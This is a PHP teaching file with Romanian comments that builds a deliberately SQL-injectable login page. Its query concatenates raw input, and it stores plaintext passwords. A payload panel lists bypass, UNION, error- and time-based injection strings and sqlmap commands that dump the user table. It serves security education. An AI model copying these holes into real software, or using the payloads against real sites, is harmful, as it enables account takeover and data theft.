<?php
// Activează afișarea erorilor pentru debugging
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// ATENȚIE: Acest cod conține vulnerabilități în mod intenționat
// Folosește doar în mediu de testare/educațional, NICIODATĂ în producție!

// Configurarea bazei de date
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "test_db";

$conn = null;
$setup_message = "";

// Funcție pentru setup-ul bazei de date
if (isset($_GET['setup'])) {
    try {
        // Conectează-te la MySQL fără a specifica baza de date
        $conn_setup = new mysqli($servername, $username, $password);
        
        if ($conn_setup->connect_error) {
            throw new Exception("Connection failed: " . $conn_setup->connect_error);
        }
        
        // Creează baza de date
        $sql_create_db = "CREATE DATABASE IF NOT EXISTS test_db";
        if ($conn_setup->query($sql_create_db) === TRUE) {
            $setup_message .= "Database 'test_db' created successfully.<br>";
        }
        
        // Selectează baza de date
        $conn_setup->select_db($dbname);
        
        // Creează tabelul
        $sql_create_table = "CREATE TABLE IF NOT EXISTS users (
            id INT AUTO_INCREMENT PRIMARY KEY,
            username VARCHAR(50) NOT NULL UNIQUE,
            password VARCHAR(50) NOT NULL,
            email VARCHAR(100),
            role VARCHAR(20) DEFAULT 'user',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )";
        
        if ($conn_setup->query($sql_create_table) === TRUE) {
            $setup_message .= "Table 'users' created successfully.<br>";
        }
        
        // Șterge utilizatorii existenți și inserează din nou
        $conn_setup->query("DELETE FROM users");
        
        // Inserează utilizatori de test
        $users = [
            ['admin', 'admin123', 'admin@test.com', 'admin'],
            ['user1', 'password1', 'user1@test.com', 'user'],
            ['test', 'test123', 'test@test.com', 'user'],
            ['guest', 'guest', 'guest@test.com', 'guest'],
            ['john', 'john2024', 'john@company.com', 'manager']
        ];
        
        foreach ($users as $user) {
            $sql_insert = "INSERT INTO users (username, password, email, role) VALUES ('{$user[0]}', '{$user[1]}', '{$user[2]}', '{$user[3]}')";
            if ($conn_setup->query($sql_insert) === TRUE) {
                $setup_message .= "User '{$user[0]}' added successfully.<br>";
            }
        }
        
        $conn_setup->close();
        
    } catch (Exception $e) {
        $setup_message = "Error during setup: " . $e->getMessage();
    }
}

// Conectează-te la baza de date pentru operațiuni normale
$conn = null;
$db_error = null;

try {
    $conn = new mysqli($servername, $username, $password, $dbname);
    
    if ($conn->connect_error) {
        throw new Exception("Connection failed: " . $conn->connect_error);
    }
    
} catch (Exception $e) {
    $db_error = $e->getMessage();
}

// Gestionarea logout-ului
if (isset($_GET['logout'])) {
    session_start();
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

// Începe sesiunea pentru a păstra starea de login
session_start();

// Procesarea formularului de login (VULNERABIL - fără sanitizare)
$login_result = "";
$executed_query = "";
$sql_error = "";

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
    if ($conn === null) {
        $login_result = "error";
        $sql_error = "Database connection is not available. " . ($db_error ? $db_error : "Unknown error");
    } else {
        $user = $_POST['username'];
        $pass = $_POST['password'];
        
        // Query vulnerabil la SQL injection (concatenare directă)
        $sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
        $executed_query = $sql;
        
        try {
            $result = $conn->query($sql);
            
            if ($result && $result->num_rows > 0) {
                $row = $result->fetch_assoc();
                $login_result = "success";
                $user_data = $row;
                
                // Salvează datele utilizatorului în sesiune
                $_SESSION['logged_in'] = true;
                $_SESSION['user_id'] = $row['id'];
                $_SESSION['username'] = $row['username'];
                $_SESSION['email'] = $row['email'];
                $_SESSION['role'] = $row['role'];
                $_SESSION['login_time'] = date('Y-m-d H:i:s');
            } else {
                $login_result = "failed";
            }
            
        } catch (Exception $e) {
            $login_result = "error";
            $sql_error = $e->getMessage();
        }
    }
}

if ($conn && !$conn->connect_error) {
    $conn->close();
}
?>

<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vulnerable Login Form - SQL Injection Testing</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input[type="submit"], .btn {
            background: #007bff;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            text-decoration: none;
            display: inline-block;
            margin-right: 10px;
        }
        input[type="submit"]:hover, .btn:hover {
            background: #0056b3;
        }
        .warning {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border: 1px solid #ffeaa7;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .success {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border: 1px solid #c3e6cb;
            border-radius: 4px;
            margin: 10px 0;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border: 1px solid #f5c6cb;
            border-radius: 4px;
            margin: 10px 0;
        }
        .query-display {
            background: #f8f9fa;
            padding: 15px;
            border: 1px solid #dee2e6;
            border-radius: 4px;
            margin: 10px 0;
            font-family: monospace;
            word-break: break-all;
        }
        .sql-examples {
            background: #e9ecef;
            padding: 20px;
            border-radius: 4px;
            margin-top: 20px;
        }
        .sql-examples h4 {
            margin-top: 0;
            color: #495057;
        }
        .payload {
            background: #fff;
            padding: 8px;
            border-radius: 4px;
            margin: 5px 0;
            font-family: monospace;
            border-left: 4px solid #007bff;
        }
        .users-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        .users-table th, .users-table td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        .btn-logout {
            background: #dc3545;
            margin-left: 10px;
        }
        .btn-logout:hover {
            background: #c82333;
        }
        .user-session {
            background: #d1ecf1;
            color: #0c5460;
            padding: 15px;
            border: 1px solid #bee5eb;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .session-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .session-details {
            flex: 1;
        }
        .users-table th {
            background-color: #f2f2f2;
        }
        @media (max-width: 600px) {
            .session-info {
                flex-direction: column;
                align-items: flex-start;
            }
            .session-actions {
                margin-top: 10px;
            }
        }
    </style>
</head>
<body>
    <!-- User Session Status -->
    <?php if (isset($_SESSION['logged_in']) && $_SESSION['logged_in']): ?>
    <div class="container">
        <div class="user-session">
            <div class="session-info">
                <div class="session-details">
                    <strong>🔐 Sesiune activă:</strong><br>
                    <strong>User:</strong> <?php echo htmlspecialchars($_SESSION['username']); ?> 
                    (<?php echo htmlspecialchars($_SESSION['role']); ?>)<br>
                    <strong>Email:</strong> <?php echo htmlspecialchars($_SESSION['email']); ?><br>
                    <strong>Login time:</strong> <?php echo $_SESSION['login_time']; ?><br>
                    <strong>Session ID:</strong> <?php echo substr(session_id(), 0, 10) . '...'; ?>
                </div>
                <div class="session-actions">
                    <a href="?logout=1" class="btn btn-logout">🚪 Logout</a>
                </div>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <div class="warning">
        <strong>⚠️ ATENȚIE:</strong> Acest formular conține vulnerabilități SQL injection în mod intenționat pentru scopuri educaționale. 
        Nu folosi niciodată acest cod în aplicații de producție!
    </div>

    <!-- Database Status -->
    <div class="container">
        <h3>📊 Database Status</h3>
        <?php if ($conn): ?>
            <div class="success">
                <strong>✅ Database Connection:</strong> SUCCESS<br>
                <strong>Server:</strong> <?php echo $servername; ?><br>
                <strong>Database:</strong> <?php echo $dbname; ?>
            </div>
        <?php else: ?>
            <div class="error">
                <strong>❌ Database Connection:</strong> FAILED<br>
                <?php if ($db_error): ?>
                    <strong>Error:</strong> <?php echo htmlspecialchars($db_error); ?><br>
                <?php endif; ?>
                <small>Asigură-te că MySQL rulează și rulează setup-ul mai întâi.</small>
            </div>
        <?php endif; ?>
    </div>
    <div class="container">
        <h3>🔧 Setup Baza de Date</h3>
        <?php if ($setup_message): ?>
            <div class="success">
                <strong>Setup Status:</strong><br>
                <?php echo $setup_message; ?>
            </div>
        <?php endif; ?>
        
        <a href="?setup=1" class="btn">Creează/Resetează Baza de Date</a>
        
        <h4>Utilizatori de test:</h4>
        <table class="users-table">
            <tr>
                <th>Username</th>
                <th>Password</th>
                <th>Role</th>
            </tr>
            <tr><td>admin</td><td>admin123</td><td>admin</td></tr>
            <tr><td>user1</td><td>password1</td><td>user</td></tr>
            <tr><td>test</td><td>test123</td><td>user</td></tr>
            <tr><td>guest</td><td>guest</td><td>guest</td></tr>
            <tr><td>john</td><td>john2024</td><td>manager</td></tr>
        </table>
    </div>

    <!-- Login Form -->
    <?php if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']): ?>
    <div class="container">
        <h2>🔐 Login Vulnerabil</h2>
        
        <form method="POST" action="">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <input type="submit" value="Login">
        </form>

        <!-- Results -->
        <?php if ($executed_query): ?>
            <div class="query-display">
                <strong>SQL Query executat:</strong><br>
                <?php echo htmlspecialchars($executed_query); ?>
            </div>
        <?php endif; ?>

        <?php if ($login_result == "success"): ?>
            <div class="success">
                <h3>✅ Login reușit!</h3>
                <strong>Bun venit, <?php echo htmlspecialchars($user_data['username']); ?>!</strong><br>
                <strong>Email:</strong> <?php echo htmlspecialchars($user_data['email']); ?><br>
                <strong>Role:</strong> <?php echo htmlspecialchars($user_data['role']); ?><br>
                <strong>ID:</strong> <?php echo htmlspecialchars($user_data['id']); ?><br>
                <small>Pagina se va reîncărca pentru a afișa sesiunea...</small>
                <script>setTimeout(function(){ window.location.reload(); }, 2000);</script>
            </div>
        <?php elseif ($login_result == "failed"): ?>
            <div class="error">
                <strong>❌ Login failed!</strong><br>
                Username sau password greșite.
            </div>
        <?php elseif ($login_result == "error"): ?>
            <div class="error">
                <strong>💥 SQL Error:</strong><br>
                <?php echo htmlspecialchars($sql_error); ?>
            </div>
        <?php endif; ?>
    </div>
    <?php else: ?>
    <div class="container">
        <h2>🎯 Dashboard - Utilizator Autentificat</h2>
        <div class="success">
            <h3>Bun venit în zona securizată!</h3>
            <p>Ești logat ca <strong><?php echo htmlspecialchars($_SESSION['username']); ?></strong> cu rolul de <strong><?php echo htmlspecialchars($_SESSION['role']); ?></strong>.</p>
            
            <h4>Informații sesiune:</h4>
            <ul>
                <li><strong>User ID:</strong> <?php echo $_SESSION['user_id']; ?></li>
                <li><strong>Email:</strong> <?php echo htmlspecialchars($_SESSION['email']); ?></li>
                <li><strong>Timp login:</strong> <?php echo $_SESSION['login_time']; ?></li>
                <li><strong>Session ID:</strong> <?php echo session_id(); ?></li>
            </ul>
            
            <p><em>Acesta este un exemplu de zonă care ar trebui să fie accesibilă doar utilizatorilor autentificați.</em></p>
        </div>
    </div>
    <?php endif; ?>

    <!-- SQL Injection Examples -->
    <div class="container">
        <div class="sql-examples">
            <h4>🎯 Payload-uri pentru SQL Injection Testing:</h4>
            
            <h5>1. Bypass autentificare:</h5>
            <div class="payload">Username: ' OR '1'='1' --</div>
            <div class="payload">Username: ' OR 1=1 --</div>
            <div class="payload">Username: admin'--</div>
            
            <h5>2. UNION-based injection:</h5>
            <div class="payload">Username: ' UNION SELECT 1,2,3,4,5,6 --</div>
            <div class="payload">Username: ' UNION SELECT null,user(),database(),version(),null,null --</div>
            
            <h5>3. Error-based injection:</h5>
            <div class="payload">Username: ' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --</div>
            
            <h5>4. Time-based injection:</h5>
            <div class="payload">Username: ' AND SLEEP(5) --</div>
            
            <h5>5. Pentru sqlmap:</h5>
            <div class="payload">
                sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" 
                --data="username=test&password=test" --dbs --batch
            </div>
            <div class="payload">
                sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" 
                --data="username=test&password=test" -D test_db --tables --batch
            </div>
            <div class="payload">
                sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" 
                --data="username=test&password=test" -D test_db -T users --dump --batch
            </div>
        </div>
    </div>

    <?php if (isset($db_error)): ?>
    <div class="container">
        <div class="error">
            <strong>Database Connection Error:</strong><br>
            <?php echo htmlspecialchars($db_error); ?><br>
            <small>Asigură-te că MySQL rulează și că ai rulat setup-ul mai întâi.</small>
        </div>
    </div>
    <?php endif; ?>
</body>
</html>